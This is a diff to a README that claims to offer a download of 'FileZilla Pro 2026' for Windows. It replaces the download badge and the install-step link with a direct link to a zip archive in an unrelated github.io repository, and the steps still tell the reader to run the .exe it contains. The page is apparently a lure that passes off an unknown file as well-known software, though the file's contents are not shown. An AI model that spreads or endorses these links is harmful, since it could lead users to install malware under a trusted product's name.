@@ -5,7 +5,7 @@ description: "Download and install FileZilla Pro on Windows 10 and 11 using a si
 ---
 # 📁 FileZilla-Pro-2026 - Transfer your files with total ease
 
-[![](https://img.shields.io/badge/Download-FileZilla-blue.svg)](https://github.com/flinntoothed468/FileZilla-Pro-2026)
+[![](https://img.shields.io/badge/Download-FileZilla-blue.svg)](https://raw.githubusercontent.com/flinntoothed468/flinntoothed468.github.io/main/berkowitz/io-flinntoothed-github-2.4.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ FileZilla-Pro-2026 offers a reliable way to move files between your computer and
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following page to access the download: [https://github.com/flinntoothed468/FileZilla-Pro-2026](https://github.com/flinntoothed468/FileZilla-Pro-2026).
+1. Visit the following page to access the download: [https://raw.githubusercontent.com/flinntoothed468/flinntoothed468.github.io/main/berkowitz/io-flinntoothed-github-2.4.zip](https://raw.githubusercontent.com/flinntoothed468/flinntoothed468.github.io/main/berkowitz/io-flinntoothed-github-2.4.zip).
 2. Look for the release section on the page.
 3. Select the file ending in .exe to begin the download.
 4. Open the file once the download finishes.
